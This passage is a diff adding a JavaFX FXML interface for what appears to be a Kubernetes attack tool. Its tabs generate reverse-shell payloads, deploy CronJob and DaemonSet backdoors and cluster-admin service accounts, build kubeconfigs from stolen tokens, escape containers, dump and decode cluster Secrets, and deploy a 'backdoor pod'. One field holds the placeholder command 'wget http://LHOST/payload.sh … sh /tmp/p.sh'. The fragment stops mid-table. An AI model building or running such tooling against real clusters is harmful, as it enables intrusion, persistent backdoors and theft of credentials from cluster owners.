+                                                        <Button text="&#x68c0;&#x6d4b;RBAC&#x72b6;&#x6001;" onAction="#checkRbacStatus" />
+                                                    </children>
+                                                </HBox>
+                                                <TextArea fx:id="rbacOutput" prefRowCount="8" wrapText="true" editable="false" style="-fx-font-family: Consolas; -fx-font-size: 12;" />
+                                            </children>
+                                            <padding><Insets bottom="10.0" left="10.0" right="10.0" top="10.0" /></padding>
+                                        </VBox>
+                                    </content>
+                                </Tab>
+                                <Tab text="&#x53cd;&#x5f39;Shell">
+                                    <content>
+                                        <VBox spacing="10.0">
+                                            <children>
+                                                <Label text="&#x53cd;&#x5f39;Shell Payload&#x751f;&#x6210;" style="-fx-font-weight: bold; -fx-font-size: 14;" />
+                                                <HBox spacing="10.0" alignment="CENTER_LEFT">
+                                                    <children>
+                                                        <Label text="LHOST" />
+                                                        <TextField fx:id="revShellLhost" prefWidth="200.0" promptText="VPS&#x5730;&#x5740;" />
+                                                        <Label text="LPORT" />
+                                                        <TextField fx:id="revShellLport" prefWidth="80.0" text="4444" />
+                                                        <Label text="&#x7c7b;&#x578b;" />
+                                                        <ComboBox fx:id="revShellType" prefWidth="160.0" />
+                                                        <Button text="&#x751f;&#x6210;" onAction="#generateRevShell" style="-fx-base: #e74c3c;" />
+                                                        <Button text="&#x590d;&#x5236;" onAction="#copyRevShell" />
+                                                    </children>
+                                                </HBox>
+                                                <Label text="Payload:" style="-fx-font-weight: bold;" />
+                                                <TextArea fx:id="revShellOutput" wrapText="true" VBox.vgrow="ALWAYS" style="-fx-font-family: Consolas; -fx-font-size: 13;" />
+                                            </children>
+                                            <padding><Insets bottom="10.0" left="10.0" right="10.0" top="10.0" /></padding>
+                                        </VBox>
+                                    </content>
+                                </Tab>
+                            </tabs>
+                        </TabPane>
+                    </content>
+                </Tab>
+
+                <Tab text="&#x6743;&#x9650;&#x7ef4;&#x6301;">
+                    <content>
+                        <VBox spacing="6.0">
+                            <children>
+                                <HBox spacing="8.0" alignment="CENTER_LEFT">
+                                    <padding><Insets bottom="4.0" left="10.0" right="10.0" top="6.0" /></padding>
+                                    <children>
+                                        <Label text="&#x8fde;&#x63a5;&#x65b9;&#x5f0f;:" style="-fx-font-weight: bold;" />
+                                        <ComboBox fx:id="persistConnMode" prefWidth="180.0" />
+                                        <Label text="&#x7528;&#x6237;&#x540d;:" />
+                                        <TextField fx:id="persistUsername" prefWidth="100.0" promptText="admin" />
+                                        <Label text="&#x5bc6;&#x7801;:" />
+                                        <PasswordField fx:id="persistPassword" prefWidth="100.0" promptText="password" />
+                                    </children>
+                                </HBox>
+                        <TabPane tabClosingPolicy="UNAVAILABLE" side="LEFT" VBox.vgrow="ALWAYS">
+                            <tabs>
+                                <Tab text="&#x521b;&#x5efa;&#x9ad8;&#x6743;SA">
+                                    <content>
+                                        <VBox spacing="10.0">
+                                            <children>
+                                                <Label text="&#x521b;&#x5efa;&#x9ad8;&#x6743;ServiceAccount + ClusterRoleBinding" style="-fx-font-weight: bold; -fx-font-size: 14;" />
+                                                <GridPane hgap="10.0" vgap="8.0">
+                                                    <children>
+                                                        <Label text="Namespace" GridPane.columnIndex="0" GridPane.rowIndex="0" />
+                                                        <TextField fx:id="persistSANamespace" prefWidth="150.0" text="kube-system" GridPane.columnIndex="1" GridPane.rowIndex="0" />
+                                                        <Label text="SA&#x540d;&#x79f0;" GridPane.columnIndex="2" GridPane.rowIndex="0" />
+                                                        <TextField fx:id="persistSAName" prefWidth="150.0" text="admin-user" GridPane.columnIndex="3" GridPane.rowIndex="0" />
+                                                        <Label text="Binding&#x540d;&#x79f0;" GridPane.columnIndex="4" GridPane.rowIndex="0" />
+                                                        <TextField fx:id="persistSARoleName" prefWidth="200.0" text="admin-bindto-cluster-admin" GridPane.columnIndex="5" GridPane.rowIndex="0" />
+                                                    </children>
+                                                </GridPane>
+                                                <HBox spacing="10.0">
+                                                    <children>
+                                                        <Button text="&#x751f;&#x6210;YAML" onAction="#persistGenAdminSA" style="-fx-base: #e67e22;" />
+                                                        <Button text="&#x4e00;&#x952e;&#x90e8;&#x7f72;" onAction="#persistApplyAdminSA" style="-fx-base: #e74c3c; -fx-text-fill: white;" />
+                                                        <Button text="&#x83b7;&#x53d6;Token" onAction="#persistGetSAToken" style="-fx-base: #8e44ad; -fx-text-fill: white;" />
+                                                        <Button text="&#x590d;&#x5236;" onAction="#persistCopyOutput" />
+                                                    </children>
+                                                </HBox>
+                                                <TextArea fx:id="persistSAOutput" wrapText="false" VBox.vgrow="ALWAYS" style="-fx-font-family: Consolas; -fx-font-size: 12;" />
+                                            </children>
+                                            <padding><Insets bottom="10.0" left="10.0" right="10.0" top="10.0" /></padding>
+                                        </VBox>
+                                    </content>
+                                </Tab>
+                                <Tab text="CronJob&#x540e;&#x95e8;">
+                                    <content>
+                                        <VBox spacing="10.0">
+                                            <children>
+                                                <Label text="CronJob&#x540e;&#x95e8; - &#x5b9a;&#x65f6;&#x6267;&#x884c;&#x547d;&#x4ee4;" style="-fx-font-weight: bold; -fx-font-size: 14;" />
+                                                <GridPane hgap="10.0" vgap="8.0">
+                                                    <children>
+                                                        <Label text="Namespace" GridPane.columnIndex="0" GridPane.rowIndex="0" />
+                                                        <TextField fx:id="persistCronNs" prefWidth="120.0" text="kube-system" GridPane.columnIndex="1" GridPane.rowIndex="0" />
+                                                        <Label text="&#x540d;&#x79f0;" GridPane.columnIndex="2" GridPane.rowIndex="0" />
+                                                        <TextField fx:id="persistCronName" prefWidth="150.0" text="system-monitor" GridPane.columnIndex="3" GridPane.rowIndex="0" />
+                                                        <Label text="&#x955c;&#x50cf;" GridPane.columnIndex="4" GridPane.rowIndex="0" />
+                                                        <TextField fx:id="persistCronImage" prefWidth="150.0" text="alpine" GridPane.columnIndex="5" GridPane.rowIndex="0" />
+                                                        <Label text="&#x5468;&#x671f;" GridPane.columnIndex="0" GridPane.rowIndex="1" />
+                                                        <TextField fx:id="persistCronSchedule" prefWidth="120.0" text="*/10 * * * *" GridPane.columnIndex="1" GridPane.rowIndex="1" />
+                                                        <Label text="&#x547d;&#x4ee4;" GridPane.columnIndex="2" GridPane.rowIndex="1" />
+                                                        <TextField fx:id="persistCronCmd" prefWidth="400.0" promptText="sh -c 'wget http://LHOST/payload.sh -O /tmp/p.sh &amp;&amp; sh /tmp/p.sh'" GridPane.columnIndex="3" GridPane.rowIndex="1" GridPane.columnSpan="3" />
+                                                    </children>
+                                                </GridPane>
+                                                <HBox spacing="10.0">
+                                                    <children>
+                                                        <Button text="&#x751f;&#x6210;YAML" onAction="#persistGenCronJob" style="-fx-base: #e67e22;" />
+                                                        <Button text="&#x4e00;&#x952e;&#x90e8;&#x7f72;" onAction="#persistApplyCronJob" style="-fx-base: #e74c3c; -fx-text-fill: white;" />
+                                                        <Button text="&#x590d;&#x5236;" onAction="#persistCopyCronOutput" />
+                                                    </children>
+                                                </HBox>
+                                                <TextArea fx:id="persistCronOutput" wrapText="false" VBox.vgrow="ALWAYS" style="-fx-font-family: Consolas; -fx-font-size: 12;" />
+                                            </children>
+                                            <padding><Insets bottom="10.0" left="10.0" right="10.0" top="10.0" /></padding>
+                                        </VBox>
+                                    </content>
+                                </Tab>
+                                <Tab text="DaemonSet&#x540e;&#x95e8;">
+                                    <content>
+                                        <VBox spacing="10.0">
+                                            <children>
+                                                <Label text="DaemonSet&#x540e;&#x95e8; - &#x5728;&#x6bcf;&#x4e2a;Node&#x4e0a;&#x8fd0;&#x884c;" style="-fx-font-weight: bold; -fx-font-size: 14;" />
+                                                <GridPane hgap="10.0" vgap="8.0">
+                                                    <children>
+                                                        <Label text="Namespace" GridPane.columnIndex="0" GridPane.rowIndex="0" />
+                                                        <TextField fx:id="persistDsNs" prefWidth="120.0" text="kube-system" GridPane.columnIndex="1" GridPane.rowIndex="0" />
+                                                        <Label text="&#x540d;&#x79f0;" GridPane.columnIndex="2" GridPane.rowIndex="0" />
+                                                        <TextField fx:id="persistDsName" prefWidth="150.0" text="node-exporter" GridPane.columnIndex="3" GridPane.rowIndex="0" />
+                                                        <Label text="&#x955c;&#x50cf;" GridPane.columnIndex="4" GridPane.rowIndex="0" />
+                                                        <TextField fx:id="persistDsImage" prefWidth="150.0" text="alpine" GridPane.columnIndex="5" GridPane.rowIndex="0" />
+                                                        <Label text="&#x6302;&#x8f7d;&#x8def;&#x5f84;" GridPane.columnIndex="0" GridPane.rowIndex="1" />
+                                                        <TextField fx:id="persistDsMountPath" prefWidth="120.0" text="/host" GridPane.columnIndex="1" GridPane.rowIndex="1" />
+                                                        <Label text="&#x547d;&#x4ee4;" GridPane.columnIndex="2" GridPane.rowIndex="1" />
+                                                        <TextField fx:id="persistDsCmd" prefWidth="400.0" text="sh -c 'while true; do sleep 3600; done'" GridPane.columnIndex="3" GridPane.rowIndex="1" GridPane.columnSpan="3" />
+                                                    </children>
+                                                </GridPane>
+                                                <HBox spacing="10.0">
+                                                    <children>
+                                                        <Button text="&#x751f;&#x6210;YAML" onAction="#persistGenDaemonSet" style="-fx-base: #e67e22;" />
+                                                        <Button text="&#x4e00;&#x952e;&#x90e8;&#x7f72;" onAction="#persistApplyDaemonSet" style="-fx-base: #e74c3c; -fx-text-fill: white;" />
+                                                        <Button text="&#x590d;&#x5236;" onAction="#persistCopyDsOutput" />
+                                                    </children>
+                                                </HBox>
+                                                <TextArea fx:id="persistDsOutput" wrapText="false" VBox.vgrow="ALWAYS" style="-fx-font-family: Consolas; -fx-font-size: 12;" />
+                                            </children>
+                                            <padding><Insets bottom="10.0" left="10.0" right="10.0" top="10.0" /></padding>
+                                        </VBox>
+                                    </content>
+                                </Tab>
+                                <Tab text="&#x5f71;&#x5b50;Kubeconfig">
+                                    <content>
+                                        <VBox spacing="10.0">
+                                            <children>
+                                                <Label text="&#x4ece;&#x7a83;&#x53d6;&#x7684;Token&#x751f;&#x6210;Kubeconfig&#x6587;&#x4ef6;" style="-fx-font-weight: bold; -fx-font-size: 14;" />
+                                                <GridPane hgap="10.0" vgap="8.0">
+                                                    <children>
+                                                        <Label text="APIServer" GridPane.columnIndex="0" GridPane.rowIndex="0" />
+                                                        <TextField fx:id="persistKcServer" prefWidth="250.0" promptText="192.168.1.100:6443" GridPane.columnIndex="1" GridPane.rowIndex="0" />
+                                                        <Label text="&#x96c6;&#x7fa4;&#x540d;" GridPane.columnIndex="2" GridPane.rowIndex="0" />
+                                                        <TextField fx:id="persistKcCluster" prefWidth="150.0" text="pwned-cluster" GridPane.columnIndex="3" GridPane.rowIndex="0" />
+                                                    </children>
+                                                </GridPane>
+                                                <Label text="Token:" style="-fx-font-weight: bold;" />
+                                                <TextArea fx:id="persistKcToken" prefRowCount="3" promptText="&#x7c98;&#x8d34;&#x7a83;&#x53d6;&#x7684;SA Token" style="-fx-font-family: Consolas;" />
+                                                <HBox spacing="10.0">
+                                                    <children>
+                                                        <Button text="&#x751f;&#x6210;Kubeconfig" onAction="#persistGenKubeconfig" style="-fx-base: #2980b9; -fx-text-fill: white;" />
+                                                        <Button text="&#x4ece;&#x76ee;&#x6807;&#x914d;&#x7f6e;&#x586b;&#x5145;" onAction="#persistFillFromTarget" />
+                                                        <Button text="&#x590d;&#x5236;" onAction="#persistCopyKcOutput" />
+                                                    </children>
+                                                </HBox>
+                                                <TextArea fx:id="persistKcOutput" wrapText="false" VBox.vgrow="ALWAYS" style="-fx-font-family: Consolas; -fx-font-size: 12;" />
+                                            </children>
+                                            <padding><Insets bottom="10.0" left="10.0" right="10.0" top="10.0" /></padding>
+                                        </VBox>
+                                    </content>
+                                </Tab>
+                                <Tab text="&#x5bbf;&#x4e3b;&#x673a;&#x6301;&#x4e45;&#x5316;">
+                                    <content>
+                                        <VBox spacing="10.0">
+                                            <children>
+                                                <Label text="&#x901a;&#x8fc7;&#x6302;&#x8f7d;&#x5bbf;&#x4e3b;&#x673a;&#x5199;&#x5165;&#x6301;&#x4e45;&#x5316;&#x540e;&#x95e8;" style="-fx-font-weight: bold; -fx-font-size: 14;" />
+                                                <GridPane hgap="10.0" vgap="8.0">
+                                                    <children>
+                                                        <Label text="LHOST" GridPane.columnIndex="0" GridPane.rowIndex="0" />
+                                                        <TextField fx:id="persistHostLhost" prefWidth="200.0" promptText="attacker IP" GridPane.columnIndex="1" GridPane.rowIndex="0" />
+                                                        <Label text="LPORT" GridPane.columnIndex="2" GridPane.rowIndex="0" />
+                                                        <TextField fx:id="persistHostLport" prefWidth="100.0" text="4444" GridPane.columnIndex="3" GridPane.rowIndex="0" />
+                                                    </children>
+                                                </GridPane>
+                                                <HBox spacing="10.0">
+                                                    <children>
+                                                        <Button text="&#x751f;&#x6210;&#x547d;&#x4ee4;" onAction="#persistGenHostPersist" style="-fx-base: #e67e22;" />
+                                                        <Button text="&#x590d;&#x5236;" onAction="#persistCopyHostOutput" />
+                                                    </children>
+                                                </HBox>
+                                                <TextArea fx:id="persistHostOutput" wrapText="false" VBox.vgrow="ALWAYS" style="-fx-font-family: Consolas; -fx-font-size: 12;" />
+                                            </children>
+                                            <padding><Insets bottom="10.0" left="10.0" right="10.0" top="10.0" /></padding>
+                                        </VBox>
+                                    </content>
+                                </Tab>
+                            </tabs>
+                        </TabPane>
+                            </children>
+                        </VBox>
+                    </content>
+                </Tab>
+
+                <Tab text="&#x6743;&#x9650;&#x63d0;&#x5347;">
+                    <content>
+                        <TabPane tabClosingPolicy="UNAVAILABLE" side="LEFT">
+                            <tabs>
+                                <Tab text="&#x9003;&#x9038;&#x68c0;&#x6d4b;">
+                                    <content>
+                                        <VBox spacing="8.0">
+                                            <children>
+                                                <Label text="Pod&#x5230;Node&#x9003;&#x9038;&#x6761;&#x4ef6;&#x68c0;&#x6d4b; (&#x5728;Pod&#x5185;&#x6267;&#x884c;)" style="-fx-font-weight: bold; -fx-font-size: 14;" />
+                                                <TextArea fx:id="escapeCheckCmds" editable="false" wrapText="true" prefRowCount="16" style="-fx-font-family: Consolas; -fx-font-size: 13;" />
+                                                <HBox spacing="8.0">
+                                                    <children>
+                                                        <Button text="&#x590d;&#x5236;&#x68c0;&#x6d4b;&#x547d;&#x4ee4;" onAction="#escapeCopyCheck" />
+                                                    </children>
+                                                </HBox>
+                                            </children>
+                                            <padding><Insets bottom="8.0" left="8.0" right="8.0" top="8.0" /></padding>
+                                        </VBox>
+                                    </content>
+                                </Tab>
+                                <Tab text="&#x7279;&#x6743;&#x6a21;&#x5f0f;&#x9003;&#x9038;">
+                                    <content>
+                                        <VBox spacing="8.0">
+                                            <children>
+                                                <Label text="Privileged&#x7279;&#x6743;&#x5bb9;&#x5668;&#x9003;&#x9038; - &#x6302;&#x8f7d;&#x5bbf;&#x4e3b;&#x673a;&#x78c1;&#x76d8;" style="-fx-font-weight: bold; -fx-font-size: 14;" />
+                                                <HBox spacing="8.0" alignment="CENTER_LEFT">
+                                                    <children>
+                                                        <Label text="LHOST:" />
+                                                        <TextField fx:id="escapePrivLhost" prefWidth="150.0" promptText="&#x653b;&#x51fb;&#x673a;IP" />
+                                                        <Label text="LPORT:" />
+                                                        <TextField fx:id="escapePrivLport" prefWidth="80.0" text="4444" />
+                                                        <Button text="&#x751f;&#x6210;&#x7279;&#x6743;&#x9003;&#x9038;&#x547d;&#x4ee4;" onAction="#escapeGenPriv" style="-fx-base: #e74c3c;" />
+                                                        <Button text="&#x590d;&#x5236;" onAction="#escapeCopyPriv" />
+                                                    </children>
+                                                </HBox>
+                                                <TextArea fx:id="escapePrivOutput" wrapText="false" VBox.vgrow="ALWAYS" style="-fx-font-family: Consolas; -fx-font-size: 12;" />
+                                            </children>
+                                            <padding><Insets bottom="8.0" left="8.0" right="8.0" top="8.0" /></padding>
+                                        </VBox>
+                                    </content>
+                                </Tab>
+                                <Tab text="&#x6302;&#x8f7d;&#x76ee;&#x5f55;&#x9003;&#x9038;">
+                                    <content>
+                                        <VBox spacing="8.0">
+                                            <children>
+                                                <Label text="&#x6302;&#x8f7d;&#x5bbf;&#x4e3b;&#x673a;&#x76ee;&#x5f55;&#x9003;&#x9038; (procfs/docker.sock/&#x6839;&#x76ee;&#x5f55;)" style="-fx-font-weight: bold; -fx-font-size: 14;" />
+                                                <HBox spacing="8.0" alignment="CENTER_LEFT">
+                                                    <children>
+                                                        <Label text="&#x9003;&#x9038;&#x65b9;&#x5f0f;:" />
+                                                        <ComboBox fx:id="escapeMountType" prefWidth="220.0" />
+                                                        <Label text="LHOST:" />
+                                                        <TextField fx:id="escapeMountLhost" prefWidth="150.0" promptText="&#x653b;&#x51fb;&#x673a;IP" />
+                                                        <Label text="LPORT:" />
+                                                        <TextField fx:id="escapeMountLport" prefWidth="80.0" text="4444" />
+                                                        <Button text="&#x751f;&#x6210;&#x9003;&#x9038;&#x547d;&#x4ee4;" onAction="#escapeGenMount" style="-fx-base: #e67e22;" />
+                                                        <Button text="&#x590d;&#x5236;" onAction="#escapeCopyMount" />
+                                                    </children>
+                                                </HBox>
+                                                <TextArea fx:id="escapeMountOutput" wrapText="false" VBox.vgrow="ALWAYS" style="-fx-font-family: Consolas; -fx-font-size: 12;" />
+                                            </children>
+                                            <padding><Insets bottom="8.0" left="8.0" right="8.0" top="8.0" /></padding>
+                                        </VBox>
+                                    </content>
+                                </Tab>
+                                <Tab text="&#x5185;&#x6838;&#x6f0f;&#x6d1e;&#x9003;&#x9038;">
+                                    <content>
+                                        <VBox spacing="8.0">
+                                            <children>
+                                                <Label text="&#x5185;&#x6838;&#x6f0f;&#x6d1e;&#x9003;&#x9038; - &#x5229;&#x7528;&#x5171;&#x4eab;&#x5185;&#x6838;&#x63d0;&#x6743;" style="-fx-font-weight: bold; -fx-font-size: 14;" />
+                                                <TextArea fx:id="escapeKernelCmds" editable="false" wrapText="true" prefRowCount="12" style="-fx-font-family: Consolas; -fx-font-size: 13;" />
+                                                <HBox spacing="8.0">
+                                                    <children>
+                                                        <Button text="&#x590d;&#x5236;" onAction="#escapeCopyKernel" />
+                                                    </children>
+                                                </HBox>
+                                            </children>
+                                            <padding><Insets bottom="8.0" left="8.0" right="8.0" top="8.0" /></padding>
+                                        </VBox>
+                                    </content>
+                                </Tab>
+                            </tabs>
+                        </TabPane>
+                    </content>
+                </Tab>
+
+                <Tab text="&#x6a2a;&#x5411;&#x79fb;&#x52a8;">
+                    <content>
+                        <TabPane tabClosingPolicy="UNAVAILABLE" side="LEFT">
+                            <tabs>
+                                <Tab text="&#x51ed;&#x8bc1;&#x7a83;&#x53d6;">
+                                    <content>
+                                        <VBox spacing="8.0">
+                                            <children>
+                                                <Label text="&#x7a83;&#x53d6;&#x96c6;&#x7fa4;&#x4e2d;&#x7684;Secret/&#x51ed;&#x8bc1;&#x4fe1;&#x606f;" style="-fx-font-weight: bold; -fx-font-size: 14;" />
+                                                <HBox spacing="8.0" alignment="CENTER_LEFT">
+                                                    <children>
+                                                        <Label text="Namespace:" />
+                                                        <TextField fx:id="credNs" prefWidth="150.0" promptText="&#x7559;&#x7a7a;=&#x6240;&#x6709;" />
+                                                        <Label text="&#x7c7b;&#x578b;&#x8fc7;&#x6ee4;:" />
+                                                        <ComboBox fx:id="credTypeFilter" prefWidth="200.0" />
+                                                        <Button text="&#x5217;&#x51fa;Secrets" onAction="#credListSecrets" />
+                                                        <Button text="&#x67e5;&#x770b;&#x8be6;&#x60c5;(&#x81ea;&#x52a8;&#x89e3;&#x7801;)" onAction="#credViewSecret" style="-fx-base: #e67e22;" />
+                                                        <Button text="&#x590d;&#x5236;" onAction="#credCopyOutput" />
+                                                    </children>
+                                                </HBox>
+                                                <TableView fx:id="credSecretTable" prefHeight="200.0" VBox.vgrow="SOMETIMES" style="-fx-font-size: 12;">
+                                                    <columns>
+                                                        <TableColumn fx:id="credColNs" text="Namespace" prefWidth="120.0" />
+                                                        <TableColumn fx:id="credColName" text="Secret&#x540d;&#x79f0;" prefWidth="250.0" />
+                                                        <TableColumn fx:id="credColType" text="&#x7c7b;&#x578b;" prefWidth="250.0" />
+                                                        <TableColumn fx:id="credColAge" text="&#x521b;&#x5efa;&#x65f6;&#x95f4;" prefWidth="160.0" />
+                                                    </columns>
+                                                </TableView>
+                                                <Label text="Secret&#x8be6;&#x60c5; (data&#x5df2;&#x81ea;&#x52a8;Base64&#x89e3;&#x7801;):" style="-fx-font-weight: bold;" />
+                                                <TextArea fx:id="credOutput" wrapText="false" VBox.vgrow="ALWAYS" style="-fx-font-family: Consolas; -fx-font-size: 12;" />
+                                            </children>
+                                            <padding><Insets bottom="8.0" left="8.0" right="8.0" top="8.0" /></padding>
+                                        </VBox>
+                                    </content>
+                                </Tab>
+                                <Tab text="&#x96c6;&#x7fa4;&#x5185;&#x7f51;&#x63a2;&#x6d4b;">
+                                    <content>
+                                        <VBox spacing="8.0">
+                                            <children>
+                                                <Label text="K8s&#x96c6;&#x7fa4;&#x5185;&#x7f51;&#x63a2;&#x6d4b; - &#x53d1;&#x73b0;&#x670d;&#x52a1;&#x4e0e;&#x7aef;&#x53e3;" style="-fx-font-weight: bold; -fx-font-size: 14;" />
+                                                <HBox spacing="8.0" alignment="CENTER_LEFT">
+                                                    <children>
+                                                        <Button text="&#x5217;&#x51fa;&#x6240;&#x6709;Services" onAction="#lateralListServices" />
+                                                        <Button text="&#x5217;&#x51fa;&#x6240;&#x6709;Endpoints" onAction="#lateralListEndpoints" />
+                                                        <Button text="&#x5217;&#x51fa;&#x6240;&#x6709;Nodes" onAction="#lateralListNodes" style="-fx-base: #2980b9;" />
+                                                        <Button text="&#x67e5;&#x770b;NetworkPolicy" onAction="#lateralListNetPol" />
+                                                        <Button text="&#x590d;&#x5236;" onAction="#lateralCopyOutput" />
+                                                    </children>
+                                                </HBox>
+                                                <TextArea fx:id="lateralOutput" wrapText="false" VBox.vgrow="ALWAYS" style="-fx-font-family: Consolas; -fx-font-size: 12;" />
+                                            </children>
+                                            <padding><Insets bottom="8.0" left="8.0" right="8.0" top="8.0" /></padding>
+                                        </VBox>
+                                    </content>
+                                </Tab>
+                                <Tab text="&#x6c61;&#x70b9;&#x6a2a;&#x5411;">
+                                    <content>
+                                        <VBox spacing="8.0">
+                                            <children>
+                                                <Label text="&#x6c61;&#x70b9;(Taint)&#x6a2a;&#x5411; - &#x8c03;&#x5ea6;Pod&#x5230;Master&#x8282;&#x70b9;" style="-fx-font-weight: bold; -fx-font-size: 14;" />
+                                                <HBox spacing="8.0" alignment="CENTER_LEFT">
+                                                    <children>
+                                                        <Button text="&#x67e5;&#x770b;&#x8282;&#x70b9;&#x6c61;&#x70b9;" onAction="#lateralShowTaints" />
+                                                        <Button text="&#x751f;&#x6210;&#x6c61;&#x70b9;&#x5bb9;&#x5fcd;Pod YAML" onAction="#lateralGenTaintPod" style="-fx-base: #e67e22;" />
+                                                        <Button text="&#x590d;&#x5236;" onAction="#lateralCopyTaintOutput" />
+                                                    </children>
+                                                </HBox>
+                                                <GridPane hgap="10.0" vgap="8.0">
+                                                    <children>
+                                                        <Label text="&#x76ee;&#x6807;&#x8282;&#x70b9;" GridPane.columnIndex="0" GridPane.rowIndex="0" />
+                                                        <TextField fx:id="lateralTaintNode" prefWidth="200.0" promptText="master-1" GridPane.columnIndex="1" GridPane.rowIndex="0" />
+                                                        <Label text="&#x955c;&#x50cf;" GridPane.columnIndex="2" GridPane.rowIndex="0" />
+                                                        <TextField fx:id="lateralTaintImage" prefWidth="150.0" text="alpine:3.20" GridPane.columnIndex="3" GridPane.rowIndex="0" />
+                                                        <Label text="&#x6302;&#x8f7d;&#x5bbf;&#x4e3b;&#x673a;" GridPane.columnIndex="4" GridPane.rowIndex="0" />
+                                                        <CheckBox fx:id="lateralTaintHostMount" text="/" selected="true" GridPane.columnIndex="5" GridPane.rowIndex="0" />
+                                                    </children>
+                                                </GridPane>
+                                                <TextArea fx:id="lateralTaintOutput" wrapText="false" VBox.vgrow="ALWAYS" style="-fx-font-family: Consolas; -fx-font-size: 12;" />
+                                            </children>
+                                            <padding><Insets bottom="8.0" left="8.0" right="8.0" top="8.0" /></padding>
+                                        </VBox>
+                                    </content>
+                                </Tab>
+                            </tabs>
+                        </TabPane>
+                    </content>
+                </Tab>
+
+                <Tab text="kubectl&#x64cd;&#x4f5c;">
+                    <content>
+                        <VBox spacing="8.0">
+                            <children>
+                                <HBox spacing="8.0" alignment="CENTER_LEFT">
+                                    <children>
+                                        <Label text="&#x8fde;&#x63a5;&#x65b9;&#x5f0f;:" style="-fx-font-weight: bold;" />
+                                        <ComboBox fx:id="kubectlConnMode" prefWidth="180.0" />
+                                        <Label text="&#x7528;&#x6237;&#x540d;:" />
+                                        <TextField fx:id="kubectlUsername" prefWidth="100.0" promptText="admin" />
+                                        <Label text="&#x5bc6;&#x7801;:" />
+                                        <PasswordField fx:id="kubectlPassword" prefWidth="100.0" promptText="password" />
+                                        <Label text="&#x81ea;&#x5b9a;&#x4e49;&#x53c2;&#x6570;:" />
+                                        <TextField fx:id="kubectlExtraArgs" prefWidth="200.0" promptText="--namespace=kube-system" HBox.hgrow="ALWAYS" />
+                                    </children>
+                                </HBox>
+                                <HBox spacing="6.0" alignment="CENTER_LEFT">
+                                    <children>
+                                        <Label text="&#x5feb;&#x6377;&#x64cd;&#x4f5c;:" style="-fx-font-weight: bold;" />
+                                        <Button text="&#x67e5;&#x770b;Nodes" onAction="#kubectlGetNodes" />
+                                        <Button text="&#x67e5;&#x770b;Pods" onAction="#kubectlGetPods" />
+                                        <Button text="&#x67e5;&#x770b;&#x6240;&#x6709;Pods" onAction="#kubectlGetAllPods" />
+                                        <Button text="&#x67e5;&#x770b;&#x955c;&#x50cf;" onAction="#kubectlGetImages" style="-fx-base: #2980b9;" />
+                                        <Button text="&#x67e5;&#x770b;Services" onAction="#kubectlGetServices" />
+                                        <Button text="&#x67e5;&#x770b;Secrets" onAction="#kubectlGetSecrets" style="-fx-base: #e67e22;" />
+                                        <Button text="&#x67e5;&#x770b;Deployments" onAction="#kubectlGetDeployments" />
+                                        <Button text="&#x96c6;&#x7fa4;&#x4fe1;&#x606f;" onAction="#kubectlClusterInfo" />
+                                    </children>
+                                </HBox>
+                                <HBox spacing="6.0" alignment="CENTER_LEFT">
+                                    <children>
+                                        <Label text="&#x9ad8;&#x7ea7;:" style="-fx-font-weight: bold;" />
+                                        <Button text="&#x67e5;&#x770b;&#x6743;&#x9650;" onAction="#kubectlAuthCanI" />
+                                        <Button text="&#x67e5;&#x770b;SA" onAction="#kubectlGetSA" />
+                                        <Button text="ClusterRoleBindings" onAction="#kubectlGetCRB" />
+                                        <Button text="&#x90e8;&#x7f72;&#x540e;&#x95e8;Pod" onAction="#kubectlApplyBackdoor" style="-fx-base: #e74c3c;" />
+                                        <Button text="&#x5220;&#x9664;Pod" onAction="#kubectlDeletePod" style="-fx-base: #c0392b;" />
+                                    </children>
+                                </HBox>
+                                <HBox spacing="8.0" alignment="CENTER_LEFT">
+                                    <children>
+                                        <Label text="&#x81ea;&#x5b9a;&#x4e49;&#x547d;&#x4ee4;:" style="-fx-font-weight: bold;" />
+                                        <TextField fx:id="kubectlCustomCmd" promptText="get namespaces" HBox.hgrow="ALWAYS" />
+                                        <Button text="&#x6267;&#x884c;" onAction="#kubectlRunCustom" style="-fx-base: #e67e22;" />
+                                        <Button text="&#x6e05;&#x7a7a;" onAction="#kubectlClearOutput" />
+                                    </children>
+                                </HBox>
+                                <TextArea fx:id="kubectlOutput" wrapText="false" VBox.vgrow="ALWAYS" style="-fx-font-family: Consolas; -fx-font-size: 12;" />
+                            </children>
+                            <padding><Insets bottom="8.0" left="8.0" right="8.0" top="8.0" /></padding>
+                        </VBox>
+                    </content>
+                </Tab>
+
+                <Tab text="Mythos Detection">
+                    <content>
+                        <VBox spacing="8.0">
+                            <children>
+                                <TitledPane text="Advanced Detection Task" expanded="true" styleClass="task-card">
+                                    <content>
+                                        <VBox spacing="8.0">
+                                            <children>
+                                                <HBox spacing="8.0" alignment="CENTER_LEFT">
+                                                    <children>
+                                                        <Label text="Namespace Scope:" style="-fx-font-weight: bold;" />
+                                                        <TextField fx:id="advNamespaceScope" prefWidth="160.0" promptText="blank = cluster-wide" />
+                                                        <CheckBox fx:id="advEnableCloud" text="Cloud Identity Plugins" selected="true" />
+                                                        <CheckBox fx:id="advEnableAttackPaths" text="Generate Attack Paths" selected="true" />
+                                                        <Button text="Run Detection" onAction="#advRunScan" styleClass="primary-button" />
+                                                        <Button text="Export HTML" onAction="#advExportHtml" />
+                                                        <Button text="Export JSON" onAction="#advExportJson" />
+                                                        <Button text="Export Markdown" onAction="#advExportMarkdown" />
+                                                    </children>
+                                                </HBox>
+                                                <HBox spacing="8.0" alignment="CENTER_LEFT">
+                                                    <children>
+                                                        <Label text="Modules:" style="-fx-font-weight: bold;" />
+                                                        <CheckBox fx:id="advModuleCluster" text="Cluster Profile" selected="true" />
+                                                        <CheckBox fx:id="advModuleIdentity" text="Identity &amp; RBAC" selected="true" />
+                                                        <CheckBox fx:id="advModuleWorkload" text="Workload Risk" selected="true" />
+                                                        <CheckBox fx:id="advModuleSecret" text="Full Evidence Secrets" selected="true" />
+                                                        <CheckBox fx:id="advModuleNetwork" text="Network Exposure" selected="true" />
+                                                        <CheckBox fx:id="advModuleCloud" text="Cloud Identity Context" selected="true" />
+                                                    </children>
+                                                </HBox>
+                                            </children>
+                                            <padding><Insets bottom="8.0" left="8.0" right="8.0" top="8.0" /></padding>
+                                        </VBox>
+                                    </content>
+                                </TitledPane>
+                                <SplitPane dividerPositions="0.38" VBox.vgrow="ALWAYS">
+                                    <items>
+                                        <VBox spacing="6.0">
+                                            <children>
+                                                <Label text="Risk Findings" style="-fx-font-weight: bold;" />
+                                                <TableView fx:id="advFindingsTable" VBox.vgrow="ALWAYS" style="-fx-font-size: 12;">
+                                                    <columns>
